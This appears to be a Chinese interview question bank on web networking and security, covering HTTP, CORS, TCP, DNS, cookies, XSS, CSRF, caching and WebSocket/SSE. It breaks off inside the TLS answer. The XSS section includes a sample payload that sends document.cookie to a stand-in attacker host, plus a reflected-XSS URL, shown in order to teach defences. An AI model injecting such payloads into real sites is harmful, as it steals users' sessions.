# 网络

<!-- id: net-001; difficulty: 1; tags: HTTP, HTTPS, TLS, 加密; source: 高频 -->
# HTTP 和 HTTPS 的区别是什么？

## HTTP 和 HTTPS 的区别

### HTTP
- 明文传输，链路中间人可以窃听和篡改内容。
- 默认端口 80。
- 不需要证书。
- 只定义应用层语义，本身不提供身份认证和加密。

### HTTPS
HTTPS 是 HTTP over TLS。

- 默认端口 443。
- 通过 TLS 加密传输内容。
- 通过证书链验证服务器身份，必要时也可以做客户端证书认证。
- 通过 AEAD/MAC 等机制保证完整性，防止内容被篡改。

SSL 是历史名称，现代实际使用 TLS。

### HTTPS 的作用
1. 加密：防止内容被明文窃听。
2. 认证：确认连接的是证书对应的服务器。
3. 完整性：发现传输过程中的篡改。

### TLS 握手简化流程
```txt
1. ClientHello：客户端发送 TLS 版本、随机数、支持的加密套件、SNI、ALPN 等。
2. ServerHello：服务器选择参数，发送证书和密钥交换材料。
3. 客户端验证证书链、域名、有效期和吊销状态等。
4. 双方通过密钥交换推导会话密钥。
5. 后续 HTTP 数据使用对称加密传输。
```

TLS 1.3 简化了握手，首次连接通常 1-RTT；会话恢复可以更快。0-RTT 有重放风险，只适合幂等请求。

### 性能和部署
HTTPS 现在通常不是主要性能瓶颈：现代 CPU 有加密加速，TLS 会话恢复降低握手成本，HTTP/2/HTTP/3 多路复用也能减少连接开销。HTTP/2 协议本身不强制 TLS，但主流浏览器基本只在 HTTPS 上启用 HTTP/2。生产站点应默认使用 HTTPS，并配合 HSTS。

<!-- id: net-002; difficulty: 1; tags: HTTP, 状态码, REST; source: 高频 -->
# HTTP 状态码有哪些？常见的有哪些？

## HTTP 状态码

### 分类
| 范围 | 类型 | 含义 |
| --- | --- | --- |
| 1xx | 信息 | 请求已接收，继续处理 |
| 2xx | 成功 | 请求已成功处理 |
| 3xx | 重定向 | 需要客户端进一步操作 |
| 4xx | 客户端错误 | 请求本身或权限有问题 |
| 5xx | 服务端错误 | 服务端或上游处理失败 |

### 常见 2xx
```txt
200 OK                请求成功
201 Created           资源创建成功，常用于 POST
202 Accepted          已接收但未完成处理，常用于异步任务
204 No Content        成功但无响应体，常用于 DELETE/PUT
206 Partial Content   Range 请求，断点续传、视频拖动
```

### 常见 3xx
```txt
301 Moved Permanently 永久重定向
302 Found             临时重定向，历史上很多客户端会把 POST 改成 GET
303 See Other         明确让客户端用 GET 访问另一个 URI
304 Not Modified      协商缓存命中，不返回响应体
307 Temporary Redirect 临时重定向，保持方法和 body
308 Permanent Redirect 永久重定向，保持方法和 body
```

301/308 表示永久，302/307 表示临时；是否缓存还要看具体响应头和浏览器策略，不能简单说 302 一定不缓存。

### 常见 4xx
```txt
400 Bad Request          请求格式或参数错误
401 Unauthorized         未认证或认证失败，通常需要 WWW-Authenticate
403 Forbidden            已理解请求，但无权限访问
404 Not Found            资源不存在
405 Method Not Allowed   方法不允许，应配合 Allow 头
409 Conflict             资源状态冲突，如重复提交、版本冲突
413 Content Too Large    请求体过大
415 Unsupported Media Type Content-Type 不支持
422 Unprocessable Content 语义正确但业务校验失败
429 Too Many Requests    限流，常配合 Retry-After
```

### 常见 5xx
```txt
500 Internal Server Error 服务端未知错误
501 Not Implemented       服务端不支持该功能
502 Bad Gateway           网关收到上游无效响应
503 Service Unavailable   服务暂不可用，维护或过载
504 Gateway Timeout       网关等待上游超时
```

### 面试重点
401 是“未认证”，403 是“已认证也不允许或没有权限”；301/302 和 307/308 的关键差异是后两者明确要求保持请求方法和请求体。

<!-- id: net-003; difficulty: 1; tags: HTTP, GET, POST, RESTful; source: 高频 -->
# GET 和 POST 请求有什么区别？

## GET 和 POST 的区别

### 核心语义
| 维度 | GET | POST |
| --- | --- | --- |
| 语义 | 获取资源表示 | 提交数据给资源处理 |
| 是否安全方法 | 是，不应产生服务端状态副作用 | 否，通常会产生副作用 |
| 幂等性 | 幂等 | 不要求幂等 |
| 参数常见位置 | URL query | 请求体 body |
| 缓存 | 天然更容易被缓存 | 默认不常缓存，但协议允许显式缓存 |
| 书签/分享 | URL 可直接保存 | body 不在 URL 中，不适合书签 |

安全方法里的“安全”指不会修改服务端资源，不是加密安全。

### REST 语义示例
```txt
GET    /users/1   获取用户
POST   /users     创建用户或提交处理
PUT    /users/1   整体替换，通常幂等
PATCH  /users/1   部分更新，不一定幂等
DELETE /users/1   删除，通常幂等
```

幂等指多次执行对服务端资源的最终影响相同，不代表响应内容每次都完全一样。例如多次 GET 同一资源，中间资源可能被别人更新，但 GET 本身不应产生修改副作用。

### 参数和安全
GET 参数放在 URL 中，会出现在浏览器历史、服务器日志、代理日志、Referer 等位置，不应放密码、token、身份证号等敏感信息。

POST 把数据放在 body 中，只是“不暴露在 URL”，并不等于安全。真正防窃听和篡改依赖 HTTPS。

### 长度限制
HTTP 协议本身没有规定 URL 只能 2KB，也没有规定 POST body 无限大。实际限制来自浏览器、服务器、代理、网关和业务配置。工程上 URL 不宜过长，请求体也要设置合理大小限制。

### GET body 误区
HTTP 语义没有把 GET body 作为常规请求语义的一部分。即使某些客户端能发送，很多服务器、缓存、代理和框架也可能忽略或不兼容。实际项目不要依赖 GET body。

### 面试总结
GET 用来取资源，安全且幂等；POST 用来提交处理，通常非幂等。安全性不由方法决定，敏感数据必须走 HTTPS，并避免出现在 URL 中。

<!-- id: net-004; difficulty: 1; tags: 跨域, CORS, 同源策略, 代理; source: 高频 -->
# 什么是跨域？为什么会出现跨域？如何解决？

## 跨域和 CORS

### 同源策略
同源策略是浏览器安全机制。两个 URL 的协议、主机名、端口都相同才算同源。

```txt
https://a.com:443/path
协议：https
主机：a.com
端口：443
```

跨域示例：
```txt
https://a.com -> http://a.com        协议不同
https://a.com -> https://b.com       主机不同
https://a.com -> https://a.com:8443  端口不同
https://a.com -> https://sub.a.com   主机不同
```

跨域限制主要发生在浏览器环境，服务器之间请求没有浏览器同源策略。表单提交、图片、script、link 等资源加载规则也和 fetch/XHR 不完全一样。

### CORS
CORS 是浏览器和服务器协作的跨源访问机制，核心是服务器用响应头告诉浏览器是否允许该 Origin 读取响应。

```http
Access-Control-Allow-Origin: https://frontend.example
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
```

如果请求携带 cookie、Authorization 等凭证，前端要设置 `credentials`，服务端要设置 `Access-Control-Allow-Credentials: true`，并且 `Access-Control-Allow-Origin` 不能是 `*`，必须是明确 Origin。

```js
fetch('https://api.example.com/user', {
  credentials: 'include',
});
```

### 简单请求和预检请求
满足特定方法、请求头和 Content-Type 条件的请求是简单请求，浏览器直接发出。否则会先发 OPTIONS 预检请求。

```http
OPTIONS /api/user HTTP/1.1
Origin: https://frontend.example
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization, content-type
```

服务端预检通过后，浏览器才会发送真实请求。可以用 `Access-Control-Max-Age` 缓存预检结果。

### 代理方案
开发环境常用 Vite dev server 代理，把浏览器看到的请求变成同源。

```js
export default {
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:3000',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, ''),
      },
    },
  },
};
```

生产环境可以用 Nginx、网关或 BFF 反向代理。

```nginx
location /api/ {
  proxy_pass http://backend:3000/;
  proxy_set_header Host $host;
}
```

### JSONP
JSONP 利用 script 标签不受 CORS 读取限制的历史特性，只支持 GET，安全性和错误处理都差，现代项目基本不用。

### 面试总结
跨域是浏览器同源策略导致的读响应限制。生产首选服务端正确配置 CORS 或同源反向代理；不要用关闭浏览器安全策略、前端伪造响应头这类错误方案。

<!-- id: net-005; difficulty: 1; tags: TCP, 三次握手, 四次挥手, 网络协议; source: 高频 -->
# TCP 三次握手和四次挥手是什么？

## TCP 三次握手和四次挥手

### 三次握手：建立连接
```txt
Client                         Server
  | ---- SYN, seq=x ----------> |
  | <--- SYN+ACK, seq=y, ack=x+1|
  | ---- ACK, ack=y+1 --------> |
  |          ESTABLISHED        |
```

三次握手要确认双方的发送和接收能力，并同步初始序列号。

1. 客户端发送 SYN，进入 SYN_SENT。
2. 服务端收到 SYN，回复 SYN+ACK，进入 SYN_RCVD。
3. 客户端收到后发送 ACK，双方进入 ESTABLISHED。

### 为什么不是两次
如果只有两次，服务端无法确认客户端是否收到了自己的 SYN+ACK，也更容易因为网络中的旧 SYN 报文导致服务端错误建立半开连接。三次握手可以确认双向链路和初始序列号都可用。

### 四次挥手：关闭连接
```txt
Client                         Server
  | ---- FIN, seq=u ----------> |
  | <--- ACK, ack=u+1 --------- |
  |                             |  服务端可能继续发送剩余数据
  | <--- FIN, seq=w ----------- |
  | ---- ACK, ack=w+1 --------> |
  |          TIME_WAIT          |
```

TCP 是全双工协议，两个方向可以独立关闭。主动关闭方发送 FIN 表示“我不再发送数据”；被动关闭方先 ACK，等自己的数据也发送完，再发送 FIN，所以常见是四次。

ACK 和 FIN 也可能合并，因此抓包里不一定总是严格四个独立报文，但逻辑上是两个方向分别关闭。

### TIME_WAIT
主动关闭方最后进入 TIME_WAIT，等待 2MSL 后才彻底关闭。MSL 是报文最大生存时间，具体时长依操作系统配置不同，不固定等于 2 分钟。

TIME_WAIT 的作用：
1. 确保最后一个 ACK 丢失时，对端重发 FIN 后还能再次 ACK。
2. 让旧连接的迟到报文在网络中自然消失，避免污染同四元组的新连接。

### 面试总结
三次握手是为了确认双向通信和同步序列号；四次挥手是因为 TCP 全双工两个方向要分别关闭；TIME_WAIT 是可靠关闭和旧报文清理的代价。

<!-- id: net-006; difficulty: 1; tags: DNS, 域名解析, 网络, 性能优化; source: 高频 -->
# 什么是 DNS？DNS 解析过程是怎样的？

## DNS（Domain Name System）

### 概念
DNS 把域名解析为 IP 地址，例如把 `www.example.com` 解析为 IPv4 或 IPv6 地址。它也承载邮件、验证、服务发现等记录。

### 解析流程
```txt
用户访问 www.example.com
1. 浏览器缓存 / 连接池相关缓存
2. 操作系统缓存、hosts 文件
3. 递归解析器缓存，通常来自运营商、公司网络或公共 DNS
4. 递归解析器向根服务器查询，得到 .com TLD 服务器
5. 向 .com TLD 查询，得到 example.com 权威 DNS
6. 向权威 DNS 查询，得到 www.example.com 的记录
7. 递归解析器按 TTL 缓存结果并返回给客户端
```

客户端通常把递归查询交给递归解析器；递归解析器再对根、TLD、权威服务器做迭代查询。

### 常见记录
```txt
A      域名 -> IPv4
AAAA   域名 -> IPv6
CNAME  别名 -> 另一个域名
MX     邮件服务器
TXT    文本记录，常用于 SPF、DKIM、域名验证
NS     域的权威 DNS 服务器
CAA    限制哪些 CA 可以给域名签发证书
SRV    服务发现
```

如果返回 CNAME，解析器还要继续解析 CNAME 指向的目标记录。

### TTL
TTL 是记录可缓存时间。TTL 短切换更快，但会增加 DNS 查询量；TTL 长缓存命中率高，但故障切换和变更生效慢。上线迁移前常先降低 TTL，迁移稳定后再调高。

### 前端优化
```html
<link rel='dns-prefetch' href='//cdn.example.com'>
<link rel='preconnect' href='https://api.example.com' crossorigin>
```

`dns-prefetch` 只提前 DNS；`preconnect` 会提前 DNS、TCP，HTTPS 下还会提前 TLS。只对关键第三方域名使用，过多 preconnect 会浪费连接资源。

### 补充
现代浏览器可能使用 DoH/DoT；CDN 常通过 DNS 调度或 Anycast 把用户导向较近节点。DNS 解析只是建连前的一步，后续还会有 TCP/TLS/HTTP 协商。

<!-- id: net-007; difficulty: 1; tags: Cookie, Session, Token, JWT, 认证; source: 高频 -->
# 什么是 Cookie、Session 和 Token？它们的区别是什么？

## Cookie、Session 和 Token

### Cookie
Cookie 是浏览器保存并按规则自动随请求发送的小段数据。

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax; Max-Age=3600; Path=/
```

常见属性：
```txt
HttpOnly  JS 不能通过 document.cookie 读取，降低 XSS 窃取风险
Secure    只在 HTTPS 请求中发送
SameSite  控制跨站请求是否携带，降低 CSRF 风险
Max-Age / Expires  过期时间
Domain / Path      作用域
```

Cookie 大小和数量有浏览器限制，单个通常约 4KB。Cookie 会自动发送，适合会话标识，但也会增加请求体积。

### Session
Session 是服务端保存的会话状态，客户端通常只保存一个 Session ID。

```txt
1. 用户登录
2. 服务端创建 session，写入 Redis/数据库/内存
3. 服务端通过 Set-Cookie 下发 sessionId
4. 后续请求浏览器自动带上 sessionId
5. 服务端查 session 得到用户状态
```

优点是服务端可主动失效、权限变更即时；缺点是服务端有状态，分布式部署要共享 session 存储或做粘性会话。

### Token / JWT
Token 是客户端携带的访问凭证。JWT 是一种常见自包含 token 格式，由 Header、Payload、Signature 组成。

```js
fetch('/api/user', {
  headers: {
    Authorization: `Bearer ${token}`,
  },
});
```

JWT 的签名只能防篡改，不等于加密；Payload 默认只是 Base64URL 编码，不能放密码等敏感信息。JWT 自包含、易水平扩展，但吊销和权限即时变更更麻烦，常配合短 access token + refresh token、黑名单或版本号机制。

### 存储位置和安全
- Token 放 localStorage：容易被 XSS 读取。
- Token 放 HttpOnly Cookie：降低 XSS 窃取，但要处理 CSRF。
- Token 放内存：刷新丢失，体验和续期要额外设计。

### 对比
| 维度 | Session Cookie | JWT / Token |
| --- | --- | --- |
| 状态 | 服务端有状态 | 可做无状态校验 |
| 主动失效 | 容易 | 需要黑名单、短期 token 或版本控制 |
| 扩展性 | 依赖共享存储 | 更适合多服务校验 |
| 主要风险 | CSRF、Session 固定 | XSS 窃取、吊销困难 |
| 数据位置 | 服务端保存会话数据 | token 可携带声明 |

### 面试总结
Cookie 是传输和存储机制，Session 是服务端会话方案，Token 是认证凭证方案。三者不是互斥关系：Session ID 可以放 Cookie，JWT 也可以放 Cookie 或 Authorization 头。

<!-- id: net-008; difficulty: 1; tags: XSS, 安全, CSP, Cookie; source: 高频 -->
# 存储型、反射型和 DOM 型 XSS 有什么区别？CSP 与 HttpOnly 各自防什么？

## XSS 类型、CSP 和 HttpOnly

### XSS 是什么
XSS 是攻击者把恶意脚本注入到页面中，让脚本在用户浏览器里以站点身份执行。它可以读取页面数据、发起操作、劫持用户流程，甚至配合 CSRF 绕过部分防御。

### 三类 XSS
#### 1. 存储型 XSS
恶意内容被保存到服务端，例如评论、昵称、文章内容。其他用户打开页面时，服务端把恶意内容输出到 HTML 中并执行。

```html
<script>fetch('https://evil.example?c=' + document.cookie)</script>
```

影响面大、持续时间长，通常最危险。

#### 2. 反射型 XSS
恶意内容来自当前请求，例如 URL 参数。服务端把参数直接拼进响应，用户点击攻击链接后触发。

```txt
https://example.com/search?q=<script>alert(1)</script>
```

#### 3. DOM 型 XSS
漏洞发生在前端 JS 中，数据不一定经过服务端。

```js
const params = new URLSearchParams(location.search);
document.querySelector('#content').innerHTML = params.get('q'); // 危险
```

### 核心防御：按上下文输出编码
不要只说“输入过滤”。输入可以校验格式，但真正防 XSS 的关键是输出到不同上下文时做正确编码。

- HTML 文本：转义 `<`、`>`、`&`、`'`、`"`。
- HTML 属性：属性编码，并避免拼接事件属性。
- URL：使用 `encodeURIComponent`。
- JS 字符串：使用安全序列化，不要直接拼脚本。
- 富文本：使用可信 HTML sanitizer 白名单。

```js
element.textContent = userInput; // 优先用安全 API
// 避免 element.innerHTML = userInput
```

React/Vue 默认会转义文本插值，但 `dangerouslySetInnerHTML`、`v-html`、手写 DOM innerHTML 仍然危险。

### CSP 防什么
CSP 是浏览器执行策略，限制脚本来源和执行方式，降低 XSS 成功后的执行能力。

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random'; object-src 'none'; base-uri 'self'
```

更推荐用 HTTP 响应头设置 CSP。nonce/hash 可以允许指定内联脚本，禁止未授权内联脚本。CSP 是纵深防御，不替代输出编码。

### HttpOnly 防什么
```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
```

`HttpOnly` 让 JS 不能读取 Cookie，降低 XSS 窃取 session 的风险。但它不能阻止恶意脚本在当前页面发起带 Cookie 的请求，所以不能单独防止 XSS 后的业务操作。

### 面试总结
存储型来自持久化内容，反射型来自请求响应反射，DOM 型来自前端不安全 DOM 操作。输出编码是主防线，CSP 是脚本执行限制，HttpOnly 保护 Cookie 不被 JS 直接读取。

<!-- id: net-009; difficulty: 1; tags: CSRF, 安全, SameSite, CSRF Token; source: 高频 -->
# SameSite、CSRF Token 和 Origin 校验如何组合防御 CSRF？

## SameSite、CSRF Token 和 Origin 校验

### CSRF 是什么
CSRF 是攻击者诱导已登录用户访问恶意页面，利用浏览器自动携带 Cookie 的特性，向目标站点发起伪造请求。

```txt
1. 用户已登录 bank.example，浏览器保存 session Cookie
2. 用户访问 evil.example
3. evil 页面提交表单或加载图片请求 bank.example/transfer
4. 浏览器自动带上 bank.example 的 Cookie
5. 如果服务端只看 Cookie，就可能误认为是用户本人操作
```

CSRF 通常不能读取跨站响应，但可以发起会改变状态的请求。

### SameSite Cookie
```http
Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Lax
```

- `Strict`：跨站场景基本不发送 Cookie，安全性强，但影响外部链接进入后的登录态体验。
- `Lax`：多数跨站子资源和表单 POST 不带 Cookie，顶级导航 GET 可带，常作为默认折中。
- `None`：跨站也发送 Cookie，必须配合 `Secure`，常见于第三方登录、嵌入式场景。

SameSite 是第一道防线，但不要只依赖它：旧浏览器、特殊跳转、业务兼容都可能让策略打折。

### CSRF Token
服务端生成不可预测 token，和用户 session 绑定。前端在状态变更请求里通过 header 或表单字段提交，服务端校验。

```html
<meta name='csrf-token' content='a1b2c3d4'>
```

```js
const token = document.querySelector('meta[name="csrf-token"]').content;

await fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': token,
  },
  body: JSON.stringify({ amount: 100 }),
});
```

攻击站点可以让浏览器带 Cookie，但通常拿不到页面里的 CSRF token，也无法设置自定义 header 通过 CORS 预检。

### Origin / Referer 校验
服务端对状态变更请求校验 `Origin`，缺失时再考虑 `Referer` 兜底。

```js
const allowed = new Set(['https://mysite.com']);

function isAllowedOrigin(value) {
  if (!value) return false;
  try {
    return allowed.has(new URL(value).origin);
  } catch {
    return false;
  }
}
```

不要用 `startsWith('https://mysite.com')`，它会误放行 `https://mysite.com.evil.example` 这类地址。Origin/Referer 可能被隐私策略、省略来源等影响，因此适合做辅助防线。

### 双重提交 Cookie
```txt
1. 服务端下发 csrf_token Cookie
2. 前端同时把 token 放入请求头或请求体
3. 服务端校验 Cookie token 和请求 token 一致
```

更安全的做法是 signed double-submit：token 带签名并绑定 session，避免子域或网络层注入 Cookie 造成绕过。

### 组合策略
1. Cookie 设置 `SameSite=Lax/Strict`、`Secure`、`HttpOnly`。
2. 所有状态变更请求校验 CSRF token。
3. 服务端校验 Origin/Referer 作为补充。
4. GET 只做读取，不做转账、删除、改密码等副作用操作。
5. XSS 会绕过很多 CSRF 防线，因此仍要单独防 XSS。

<!-- id: net-010; difficulty: 1; tags: HTTP缓存, 强缓存, 协商缓存, Cache-Control; source: 高频 -->
# 什么是浏览器缓存？强缓存和协商缓存的流程？

## 浏览器缓存：强缓存和协商缓存

### 缓存层次
常见缓存包括 HTTP memory cache、disk cache、Service Worker Cache Storage、CDN/代理缓存等。Service Worker 是脚本可控缓存，不等同于普通 HTTP 缓存。HTTP/2 Push Cache 已经不应作为现代浏览器缓存重点。

### 请求流程
```txt
发起请求
  -> Service Worker 是否拦截
  -> HTTP 缓存是否有可用响应
     -> 新鲜：强缓存命中，直接使用缓存
     -> 过期或 no-cache：发条件请求做协商缓存
        -> 304 Not Modified：复用本地缓存体
        -> 200 OK：使用新响应并按规则缓存
  -> 无缓存：网络请求
```

### 强缓存
强缓存命中时，浏览器不需要向服务器确认。

```http
Cache-Control: max-age=3600
Expires: Thu, 01 Jan 2026 00:00:00 GMT
```

`Cache-Control` 优先级高于 `Expires`。常见指令：
```txt
max-age=3600       缓存新鲜期秒数
s-maxage=3600      共享缓存优先使用，如 CDN
public             可被共享缓存保存
private            只给浏览器私有缓存
no-cache           可以存，但每次用前必须 revalidate
no-store           不存储任何副本
immutable          新鲜期内认为资源不会变
must-revalidate    过期后必须重新验证
```

注意：`no-cache` 不是“不缓存”，而是“缓存但使用前必须协商”。

### 协商缓存
#### Last-Modified / If-Modified-Since
```http
Last-Modified: Wed, 21 Oct 2024 07:28:00 GMT
If-Modified-Since: Wed, 21 Oct 2024 07:28:00 GMT
```

基于修改时间，精度通常到秒，可能受文件时间、时钟、快速连续发布影响。

#### ETag / If-None-Match
```http
ETag: "abc123"
If-None-Match: "abc123"
```

ETag 是资源版本标识，可以是内容哈希或服务端生成的版本号。`If-None-Match` 优先级通常高于 `If-Modified-Since`。ETag 有强弱之分，弱 ETag 形如 `W/"abc"`。

### 最佳实践
```txt
HTML：Cache-Control: no-cache
带 hash 的 JS/CSS：Cache-Control: public, max-age=31536000, immutable
不带 hash 的静态资源：较短 max-age + ETag
用户私有 API：Cache-Control: private, no-cache 或按业务设置
敏感数据：Cache-Control: no-store
```

核心思路：入口 HTML 保持可更新，带内容 hash 的静态资源长期缓存，接口按数据实时性和隐私等级单独设计。

<!-- id: net-011; difficulty: 2; tags: HTTP/2, HTTP/3, QUIC, 多路复用; source: 高频 -->
# HTTP/1.1、HTTP/2、HTTP/3 的主要区别是什么？

## HTTP/1.1、HTTP/2、HTTP/3 对比

### 核心结论
三者最大的差异不是“语义变了”，而是连接复用、头部压缩、队头阻塞和握手成本的处理方式不同。HTTP 方法、状态码、Header 等语义基本保持一致。

### HTTP/1.1
- 基于 TCP，默认长连接。
- 同一连接上的请求/响应基本按顺序处理，容易出现应用层队头阻塞。
- 浏览器通常用多个 TCP 连接提升并发，但会增加握手和拥塞控制成本。
- Header 每次重复发送，Cookie 大时尤其浪费。

### HTTP/2
- 仍基于 TCP，但引入二进制分帧和 Stream。
- 一个 TCP 连接上可以并行多个 Stream，解决 HTTP 应用层队头阻塞。
- 使用 HPACK 压缩头部。
- 仍受 TCP 跨流队头阻塞影响：底层丢包时，同一 TCP 连接里的多个流都可能等待重传。
- Server Push 虽然属于 HTTP/2 能力，但现代浏览器实践中基本不推荐，通常用 `preload` 或 `103 Early Hints` 替代。

### HTTP/3
- 基于 QUIC，QUIC 运行在 UDP 之上并集成 TLS 1.3。
- 使用 QPACK 压缩头部。
- 不同 QUIC Stream 彼此独立，一个流丢包通常不会阻塞其他流。
- 支持连接迁移，移动网络切换时比 TCP 更稳。
- 0-RTT 只适用于会话恢复，并且要注意重放风险。

### 对比表
| 维度 | HTTP/1.1 | HTTP/2 | HTTP/3 |
| --- | --- | --- | --- |
| 传输基础 | TCP | TCP | QUIC over UDP |
| 多路复用 | 依赖多连接 | 单连接多 Stream | QUIC 多 Stream |
| 头部压缩 | 无 | HPACK | QPACK |
| 队头阻塞 | 应用层明显 | TCP 跨流仍存在 | 主要解决跨流阻塞 |
| 握手 | TCP + TLS | TCP + TLS | QUIC + TLS 1.3 |
| 网络切换 | 连接易断 | 连接易断 | 支持连接迁移 |

### 面试表达
可以总结为：HTTP/2 主要提升“一个连接里如何并发传输”，HTTP/3 进一步把传输层从 TCP 换成 QUIC，重点改善弱网、丢包和网络切换下的体验。

<!-- id: net-012; difficulty: 2; tags: CORS, 跨域, 预检请求, OPTIONS; source: 高频 -->
# CORS 的工作原理是什么？什么是预检请求？

## CORS 工作原理

### 请求分类

**简单请求**（不触发预检）
```
条件：
- 方法是 GET、HEAD、POST 之一
- 请求头只有：Accept、Accept-Language、Content-Language、Content-Type
- Content-Type 只能是：text/plain、multipart/form-data、application/x-www-form-urlencoded
```

```js
// 简单请求：直接发送，服务器通过响应头控制
fetch('https://api.example.com/data');

// 服务器响应
Access-Control-Allow-Origin: https://frontend.com
```

**预检请求（Preflight）**
```
触发条件（不满足简单请求条件）：
- 使用了 PUT/DELETE/PATCH 等方法
- 添加了自定义头（如 Authorization）
- Content-Type 为 application/json
```

```
流程：
1. 浏览器先发 OPTIONS 请求（预检）
   OPTIONS /api/users HTTP/1.1
   Origin: https://frontend.com
   Access-Control-Request-Method: POST
   Access-Control-Request-Headers: Content-Type, Authorization

2. 服务器响应（允许则返回）
   Access-Control-Allow-Origin: https://frontend.com
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   Access-Control-Allow-Headers: Content-Type, Authorization
   Access-Control-Max-Age: 86400  // 预检缓存时间

3. 浏览器发送实际请求
```

### 携带凭证（Cookie）
```js
// 前端设置
fetch('https://api.example.com/user', {
  credentials: 'include'
});

// 服务器响应头
Access-Control-Allow-Origin: https://frontend.com  // 不能是 *
Access-Control-Allow-Credentials: true
```

### Node.js 配置 CORS
```js
// 使用 cors 中间件
import cors from 'cors';

app.use(cors({
  origin: ['https://frontend.com', 'http://localhost:3000'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400
}));
```

<!-- id: net-013; difficulty: 2; tags: WebSocket, 实时通信, 全双工, HTTP; source: 高频 -->
# 什么是 WebSocket？它与 HTTP 有什么区别？

## WebSocket

### 概念
WebSocket 是浏览器和服务器之间的持久化全双工通信协议。连接建立后，客户端和服务端都可以主动发送消息，适合低延迟实时通信。

### 与 HTTP 的区别
| 维度 | HTTP | WebSocket |
| --- | --- | --- |
| 通信模型 | 请求-响应为主 | 全双工消息通信 |
| 连接 | HTTP/1.1 可长连接，但一次请求对应一次响应 | 一次握手后长期保持 |
| 服务端主动消息 | 需要轮询、SSE 等方案 | 原生支持服务端主动发送 |
| 数据开销 | 每次请求/响应都有 HTTP 头 | 握手后使用较小帧头 |
| 地址 | http/https | ws/wss |
| 典型场景 | 页面、API、资源加载 | 聊天、协作、行情、游戏 |

HTTP/2、SSE、长轮询也能做一定实时能力，但 WebSocket 更适合双向高频消息。

### 握手过程
WebSocket 通常先通过 HTTP Upgrade 建立连接。

```http
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

服务器同意后返回：
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

之后双方按 WebSocket 帧格式通信。生产环境优先使用 `wss://`，也就是 WebSocket over TLS。

### 前端使用
```js
const ws = new WebSocket('wss://chat.example.com');

ws.addEventListener('open', () => {
  ws.send(JSON.stringify({ type: 'join', room: 'general' }));
});

ws.addEventListener('message', (event) => {
  const message = JSON.parse(event.data);
  console.log(message);
});

ws.addEventListener('close', (event) => {
  console.log(event.code, event.reason);
});

ws.addEventListener('error', (event) => {
  console.error(event);
});
```

### 工程注意
1. 需要心跳和超时检测，及时发现断线。
2. 需要重连策略，通常指数退避并限制最大间隔。
3. 服务端要做鉴权、限流和连接数控制。
4. 代理层要支持 Upgrade，并配置合理 idle timeout。
5. 消息协议要有 type、requestId、错误码等约定。

### 适用场景
实时聊天、在线协作、游戏、行情、监控看板、实时通知。只需要服务端单向推送时，SSE 往往更简单。

<!-- id: net-014; difficulty: 2; tags: SSE, Server-Sent Events, 实时通信, WebSocket; source: 高频 -->
# 什么是 SSE（Server-Sent Events）？与 WebSocket 有何区别？

## SSE（Server-Sent Events）

### 概念
SSE 是基于 HTTP 的服务器到客户端单向推送技术，响应类型是 `text/event-stream`。浏览器通过 `EventSource` 保持连接，服务端持续写入事件流。

### 客户端
```js
const source = new EventSource('/api/stream');

source.onmessage = (event) => {
  console.log(event.data);
};

source.addEventListener('news', (event) => {
  console.log('news', event.data);
});

source.onerror = () => {
  console.log('connection error, browser will retry');
};

source.close();
```

`EventSource` 原生只支持 GET，不方便自定义请求头。鉴权通常用 Cookie、同源 session，或短期 token 放 query 中；跨域带 Cookie 需要 `{ withCredentials: true }` 和正确 CORS 配置。

### 服务端格式
```js
app.get('/api/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders?.();

  const send = (event, data, id) => {
    if (id) res.write(`id: ${id}\n`);
    if (event) res.write(`event: ${event}\n`);
    res.write(`data: ${JSON.stringify(data)}\n\n`);
  };

  const timer = setInterval(() => {
    send('news', { time: Date.now() });
  }, 1000);

  req.on('close', () => clearInterval(timer));
});
```

每条消息以空行结束。多行 `data:` 会被客户端合并为带换行的数据。

### 字段
```txt
id: 123          事件 ID，断线重连时浏览器会带 Last-Event-ID
event: news      自定义事件名
data: hello      数据行
retry: 3000      建议客户端重连间隔，毫秒
```

SSE 默认自动重连，服务端可以用 `id` 支持断点续传。

### SSE vs WebSocket
| 维度 | SSE | WebSocket |
| --- | --- | --- |
| 方向 | 服务端 -> 客户端 | 双向 |
| 底层 | HTTP 响应流 | WebSocket 协议 |
| 重连 | 浏览器自动重连 | 通常手动实现 |
| 数据格式 | 文本事件流 | 文本或二进制帧 |
| 自定义请求头 | EventSource 不方便 | 握手阶段受浏览器 API 限制，也通常不随意设 |
| 场景 | 通知、日志、AI 流式输出、行情单向推送 | 聊天、游戏、协作、双向实时 |

### 注意
1. HTTP/1.1 下浏览器对同源连接数有限，多个 SSE 连接可能受限；HTTP/2 下会好很多。
2. 代理和网关可能缓冲响应，要关闭缓冲或发送心跳。
3. SSE 是文本协议，不适合大量二进制数据。
4. 只需要服务器单向推送时，SSE 比 WebSocket 简单。

<!-- id: net-015; difficulty: 2; tags: TLS, SSL, HTTPS, 加密, 握手; source: 高频 -->
# 什么是 TLS/SSL 握手过程？

## TLS/SSL 握手过程

SSL 是旧称，现代 HTTPS 使用 TLS。TLS 握手要完成三件事：协商协议参数、认证服务器身份、生成后续对称加密使用的会话密钥。

### TLS 1.2 简化流程
```txt
Client                                  Server
  | ---- ClientHello -----------------> |
